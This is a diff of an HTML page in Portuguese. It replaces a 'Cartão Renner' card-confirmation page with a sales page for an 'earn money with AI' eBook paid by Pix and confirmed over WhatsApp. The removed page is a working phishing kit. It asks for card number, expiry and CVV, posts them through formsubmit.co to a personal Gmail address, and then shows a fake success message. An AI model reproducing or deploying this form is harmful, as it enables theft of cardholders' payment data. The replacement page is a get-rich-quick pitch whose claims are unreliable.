@@ -1,159 +1,87 @@
-<!DOCTYPE html>
-<html lang="pt-br">
+<!DOCTYPE html><html lang="pt-BR">
 <head>
   <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Cartão Renner - Confirmação</title>
-  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Guia: Ganhe Dinheiro com IA - Nathan</title>
   <style>
     body {
-      margin: 0;
-      background-color: #f3f3f3;
-      font-family: 'Roboto', sans-serif;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      min-height: 100vh;
+      font-family: Arial, sans-serif;
+      background: #000;
+      color: #fff;
+      text-align: center;
       padding: 20px;
     }
-
     .container {
-      background-color: #fff;
-      padding: 32px 32px 20px 32px;
-      border-radius: 14px;
-      box-shadow: 0 4px 10px rgba(0,0,0,0.08);
-      max-width: 380px;
-      width: 100%;
-      text-align: center;
-      transition: all 0.3s ease;
+      max-width: 500px;
+      margin: auto;
     }
-
-    h2 {
-      color: #c5002e;
-      margin-bottom: 25px;
-      font-size: 22px;
-    }
-
-    input {
+    img {
       width: 100%;
-      padding: 12px 14px;
-      margin: 10px 0;
-      border: 1px solid #ccc;
       border-radius: 10px;
-      font-size: 15px;
-      transition: border 0.3s;
+      margin-bottom: 20px;
     }
-
-    input:focus {
-      outline: none;
-      border-color: #c5002e;
-    }
-
-    button {
-      width: 100%;
-      background-color: #c5002e;
-      color: white;
-      border: none;
-      padding: 14px;
-      font-size: 16px;
-      font-weight: bold;
+    .pix-box {
+      background: #222;
+      padding: 20px;
       border-radius: 10px;
-      cursor: pointer;
-      margin-top: 12px;
-      transition: background-color 0.3s;
+      margin-bottom: 20px;
     }
-
-    button:hover {
-      background-color: #a80025;
-    }
-
-    .info {
-      font-size: 13px;
-      color: #777;
-      margin-top: 14px;
-    }
-
-    .hidden {
-      display: none;
-    }
-
-    .loading img {
-      width: 45px;
-      margin-bottom: 15px;
-      animation: spin 1s linear infinite;
-    }
-
-    @keyframes spin {
-      0% { transform: rotate(0deg);}
-      100% { transform: rotate(360deg);}
-    }
-
-    .final h2 {
-      color: #2e7d32;
-      font-size: 20px;
-    }
-
-    .final p {
+    .pix-box code {
+      word-break: break-all;
+      display: block;
+      margin-bottom: 10px;
       font-size: 14px;
-      color: #555;
-      margin-top: 10px;
+      color: #FFD700;
+    }
+    .copy-btn {
+      background: #FFD700;
+      color: #000;
+      padding: 10px 20px;
+      border: none;
+      font-weight: bold;
+      cursor: pointer;
+      border-radius: 8px;
+    }
+    .whatsapp-btn {
+      background: #25D366;
+      color: #fff;
+      padding: 10px 20px;
+      border: none;
+      text-decoration: none;
+      font-weight: bold;
+      border-radius: 8px;
+      display: inline-block;
+      margin-top: 20px;
     }
   </style>
 </head>
 <body>
-
-  <!-- Tela de cadastro -->
-  <div class="container" id="formulario">
-    <h2>Confirme os dados do seu cartão Renner</h2>
-    <form id="cartaoForm">
-      <input type="text" name="numero_cartao" placeholder="Número do cartão" required maxlength="19">
-      <input type="text" name="validade" placeholder="Validade (MM/AA)" required maxlength="5">
-      <input type="text" name="cvv" placeholder="Código de segurança (CVV)" required maxlength="4">
-      <input type="hidden" name="_captcha" value="false">
-      <button type="submit">Confirmar</button>
-    </form>
-    <p class="info">Suas informações estão protegidas com segurança.</p>
-  </div>
-
-  <!-- Tela de carregamento -->
-  <div class="container hidden" id="carregando">
-    <div class="loading">
-      <img src="https://i.gifer.com/ZZ5H.gif" alt="Carregando">
-      <p>Processando seu cadastro...</p>
+  <div class="container">
+    <h1>💰 Guia Exclusivo: Ganhe Dinheiro com seu Celular e IA</h1>
+    <img src="capa-ebook.png" alt="Capa do eBook" />
+    <p>Aprenda a usar ChatGPT, Canva e CapCut para faturar usando apenas seu celular!</p>
+    <ul style="text-align:left">
+      <li>✅ Passo a passo simples para iniciantes</li>
+      <li>✅ Funciona ainda em 2025</li>
+      <li>✅ Sem precisar aparecer</li>
+    </ul>
+    <div class="pix-box">
+      <h3>Valor: R$19,90</h3>
+      <p>Copie o código Pix abaixo e pague direto no seu app bancário:</p>
+      <code id="pix-code">00020126710014br.gov.bcb.pix0114+55169912701470231Tutoriais em Alta em Junho 20255204000053039865802BR5901N6001C62070503***63044D41</code>
+      <button class="copy-btn" onclick="copyPix()">Copiar Código Pix</button>
     </div>
+    <a class="whatsapp-btn" href="https://wa.me/5513997031287" target="_blank">
+      Enviar comprovante no WhatsApp →
+    </a>
   </div>
-
-  <!-- Tela final -->
-  <div class="container hidden final" id="final">
-    <h2>Cadastro enviado com sucesso!</h2>
-    <p>Você receberá um retorno por e-mail ou telefone em breve.</p>
-  </div>
-
   <script>
-    const form = document.getElementById("cartaoForm");
-    const formulario = document.getElementById("formulario");
-    const carregando = document.getElementById("carregando");
-    const final = document.getElementById("final");
-
-    form.addEventListener("submit", function(e) {
-      e.preventDefault();
-
-      formulario.classList.add("hidden");
-      carregando.classList.remove("hidden");
-
-      const dados = new FormData(form);
-      fetch("https://formsubmit.co/ajax/natanaelverissimo34@gmail.com", {
-        method: "POST",
-        headers: { 'Accept': 'application/json' },
-        body: dados
+    function copyPix() {
+      const code = document.getElementById('pix-code').innerText;
+      navigator.clipboard.writeText(code).then(() => {
+        alert('Código Pix copiado! Agora abra seu app e cole para pagar.');
       });
-
-      setTimeout(() => {
-        carregando.classList.add("hidden");
-        final.classList.remove("hidden");
-      }, 2500);
-    });
+    }
   </script>
-
 </body>
 </html>
